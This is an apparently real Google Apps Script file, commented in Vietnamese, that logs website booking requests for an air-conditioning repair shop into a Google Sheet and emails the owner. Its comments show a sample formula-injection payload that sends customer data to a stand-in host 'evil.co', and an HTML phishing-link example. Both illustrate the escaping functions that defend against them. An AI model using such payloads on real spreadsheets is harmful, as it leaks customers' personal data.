/**
 * ============================================================
 *  ĐIỆN LẠNH THÁI TUẤN — nhận yêu cầu đặt lịch từ website
 *  Dán toàn bộ file này vào Apps Script của Google Sheet.
 *  Hướng dẫn từng bước: docs/HUONG-DAN-GOOGLE-SHEET.md
 * ============================================================
 */

// Chuỗi bí mật — PHẢI trùng đúng với GOOGLE_SHEET_SECRET trong .env.local của website.
// KHÔNG ghi chuỗi thật vào file này nếu repo được đẩy lên GitHub.
// Lấy giá trị thật trong .env.local (file này không được commit) rồi dán vào đây
// TRƯỚC KHI dán code sang Apps Script.
const SECRET = 'DAN_CHUOI_BI_MAT_VAO_DAY';

// Email nhận thông báo mỗi khi có khách đặt lịch
const NOTIFY_EMAIL = 'nguyenlethaituan10122002@gmail.com';

const SHEET_NAME = 'Leads';

const HEADERS = [
  'Thời gian', 'Họ tên', 'Số điện thoại', 'Dịch vụ', 'Địa chỉ',
  'Mô tả tình trạng', 'Nguồn', 'Thiết bị', 'Trạng thái', 'Ghi chú nội bộ',
];

/**
 * CHẠY HÀM NÀY MỘT LẦN DUY NHẤT sau khi dán code.
 * Nó tự tạo tab "Leads", kẻ tiêu đề, tô màu và bật bộ lọc.
 */
function thietLapBanDau() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sheet = ss.getSheetByName(SHEET_NAME);
  if (!sheet) sheet = ss.insertSheet(SHEET_NAME);

  sheet.clear();
  sheet.getRange(1, 1, 1, HEADERS.length).setValues([HEADERS]);

  const head = sheet.getRange(1, 1, 1, HEADERS.length);
  head.setBackground('#0E2352').setFontColor('#FFFFFF').setFontWeight('bold');
  sheet.setFrozenRows(1);

  // Độ rộng cột cho dễ đọc
  const widths = [140, 160, 130, 190, 280, 260, 120, 90, 120, 200];
  widths.forEach(function (w, i) { sheet.setColumnWidth(i + 1, w); });

  // Cột "Số điện thoại" để dạng văn bản, tránh Google cắt mất số 0 đầu
  sheet.getRange('C:C').setNumberFormat('@');

  // Tô màu theo trạng thái xử lý
  const col = sheet.getRange('I2:I1000');
  const mau = [
    ['Mới', '#FEF3C7', '#92400E'],
    ['Đã gọi', '#DBEAFE', '#1E40AF'],
    ['Đã đặt lịch', '#E0E7FF', '#3730A3'],
    ['Hoàn thành', '#D1FAE5', '#065F46'],
    ['Huỷ', '#E5E7EB', '#4B5563'],
  ];
  const rules = mau.map(function (m) {
    return SpreadsheetApp.newConditionalFormatRule()
      .whenTextEqualTo(m[0])
      .setBackground(m[1]).setFontColor(m[2]).setBold(true)
      .setRanges([col]).build();
  });
  sheet.setConditionalFormatRules(rules);

  // Ô chọn trạng thái thay vì gõ tay
  col.setDataValidation(
    SpreadsheetApp.newDataValidation()
      .requireValueInList(mau.map(function (m) { return m[0]; }), true)
      .setAllowInvalid(false).build()
  );

  // sheet.clear() KHONG xoa bo loc cu, nen phai tu go truoc.
  // Neu khong, lan chay thu hai se bao "trang tinh da co bo loc".
  const boLocCu = sheet.getFilter();
  if (boLocCu) boLocCu.remove();
  sheet.getRange(1, 1, 1, HEADERS.length).createFilter();

  // KHONG dung SpreadsheetApp.getUi().alert() o day.
  // Hop thoai do CHAN script, dung cho nguoi dung bam OK. Khi chay tu trinh
  // soan ma (tab bang tinh khong mo), khong ai bam -> script treo tron 6 phut
  // roi bi Google cat voi loi "Exceeded maximum execution time".
  // Ghi ra nhat ky la du.
  console.log('Da thiet lap xong tab "' + SHEET_NAME + '". Gio bam Trien khai de lay link.');
}

/**
 * ------------------------------------------------------------
 *  HAI HÀM AN TOÀN — đừng xoá
 * ------------------------------------------------------------
 */

/**
 * Chặn "formula injection".
 * Nếu khách điền tên là =IMPORTXML("https://evil.co/?x="&C2,"//a") thì Google Sheets
 * sẽ CHẠY công thức đó khi chủ tiệm mở bảng, và gửi dữ liệu khách khác ra ngoài.
 * Chèn dấu nháy đơn phía trước để Sheets hiểu đây là văn bản, không phải công thức.
 * Dấu nháy này không hiển thị trong ô nên không ảnh hưởng việc đọc.
 */
function oAnToan(giaTri) {
  const s = String(giaTri == null ? '' : giaTri);
  if (s === '') return '';
  // Bốn ký tự mở đầu mà Sheets/Excel coi là công thức
  if (/^[=+\-@]/.test(s)) return "'" + s;
  // Tab và xuống dòng đầu chuỗi cũng kích hoạt công thức trong Excel
  if (/^[\t\r\n]/.test(s)) return "'" + s;
  return s;
}

/**
 * Chặn HTML injection vào email báo về.
 * Không có hàm này thì khách điền tên là <a href="https://lua-dao.co">Bấm đây</a>
 * sẽ chèn được link lừa đảo vào chính email chủ tiệm đọc.
 */
function chuAnToan(giaTri) {
  return String(giaTri == null ? '' : giaTri)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/** Website gọi vào đây mỗi khi có khách gửi form. */
function doPost(e) {
  try {
    const d = JSON.parse(e.postData.contents);

    if (d.secret !== SECRET) {
      return json({ ok: false, error: 'sai-khoa' });
    }

    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const sheet = ss.getSheetByName(SHEET_NAME) || ss.insertSheet(SHEET_NAME);
    if (sheet.getLastRow() === 0) {
      sheet.getRange(1, 1, 1, HEADERS.length).setValues([HEADERS]);
    }

    const now = Utilities.formatDate(new Date(), 'Asia/Ho_Chi_Minh', 'dd/MM/yyyy HH:mm');

    sheet.appendRow([
      now,
      oAnToan(d.name),
      "'" + String(d.phone || ''),   // dấu ' giữ nguyên số 0 đầu
      oAnToan(d.service),
      oAnToan(d.address),
      oAnToan(d.note),
      oAnToan(d.source || 'truc-tiep'),
      oAnToan(d.device),
      'Mới',
      '',
    ]);

    guiEmail(d, now);
    return json({ ok: true });
  } catch (err) {
    return json({ ok: false, error: String(err) });
  }
}

/** Cho phép mở link bằng trình duyệt để kiểm tra deploy đã chạy chưa. */
function doGet() {
  return json({ ok: true, message: 'Webhook Điện Lạnh Thái Tuấn đang hoạt động.' });
}

function guiEmail(d, now) {
  try {
    // Số điện thoại dùng trong href="tel:" nên phải lọc, chỉ giữ chữ số và dấu +
    const phone = String(d.phone || '').replace(/[^0-9+]/g, '');
    MailApp.sendEmail({
      to: NOTIFY_EMAIL,
      subject: '🔔 Yêu cầu mới: ' + String(d.service || 'Chưa rõ').replace(/[\r\n]/g, ' ') + ' — ' + phone,
      htmlBody:
        '<div style="font-family:Arial,sans-serif;max-width:520px">' +
        '<h2 style="color:#0E2352;margin:0 0 4px">Yêu cầu đặt lịch mới</h2>' +
        '<p style="color:#64748B;margin:0 0 16px;font-size:13px">' + chuAnToan(now) + '</p>' +
        '<table cellpadding="8" style="border-collapse:collapse;width:100%;font-size:14px">' +
        hang('Khách hàng', chuAnToan(d.name)) +
        hang('Số điện thoại', '<a href="tel:' + phone + '" style="color:#195A9E;font-weight:bold;font-size:17px">' + phone + '</a>') +
        hang('Dịch vụ', chuAnToan(d.service)) +
        hang('Địa chỉ', chuAnToan(d.address)) +
        hang('Tình trạng', chuAnToan(d.note) || '(không ghi)') +
        hang('Nguồn', chuAnToan(d.source || 'truc-tiep')) +
        '</table>' +
        '<p style="margin-top:18px"><a href="' + SpreadsheetApp.getActiveSpreadsheet().getUrl() +
        '" style="background:#06B6D4;color:#04283A;padding:11px 20px;border-radius:8px;' +
        'text-decoration:none;font-weight:bold;display:inline-block">Mở bảng tính</a></p>' +
        '</div>',
    });
  } catch (err) {
    // Gửi email lỗi cũng không được làm hỏng việc ghi dữ liệu
    console.error('Không gửi được email: ' + err);
  }
}

function hang(nhan, giaTri) {
  return '<tr>' +
    '<td style="border-bottom:1px solid #E2E8F0;color:#64748B;width:130px">' + nhan + '</td>' +
    '<td style="border-bottom:1px solid #E2E8F0;color:#0F172A"><b>' + (giaTri || '') + '</b></td>' +
    '</tr>';
}

function json(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
